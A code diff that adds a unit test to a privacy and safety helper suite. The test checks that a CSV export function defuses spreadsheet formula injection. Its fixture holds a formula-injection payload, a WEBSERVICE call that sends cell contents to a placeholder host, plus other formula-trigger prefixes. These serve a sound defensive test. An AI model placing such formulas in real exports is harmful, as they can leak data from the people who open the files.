@@ -225,6 +225,24 @@ describe("privacy and safety helpers", () => {
     expect(csv.split("\n")[0]).toContain("ordered_exchange_time");
   });
 
+  it("neutralizes spreadsheet formulas in CSV exports", () => {
+    const csv = rowsToCsv([
+      {
+        title: "=WEBSERVICE(\"https://example.test/?x=\"&A1)",
+        note: "+cmd",
+        offset: "-2+3",
+        handle: "@user",
+        tabbed: "\t=SUM(A1:A2)",
+      },
+    ]);
+
+    expect(csv).toContain("'=WEBSERVICE");
+    expect(csv).toContain("'+cmd");
+    expect(csv).toContain("'-2+3");
+    expect(csv).toContain("'@user");
+    expect(csv).toContain("'\t=SUM");
+  });
+
   it("builds section export packets with chart and table data", () => {
     const dataset = createRecordsSeed();
     const packet = buildSectionExportPacket(dataset, demoUserId, demoCaseId, range, "exchanges");
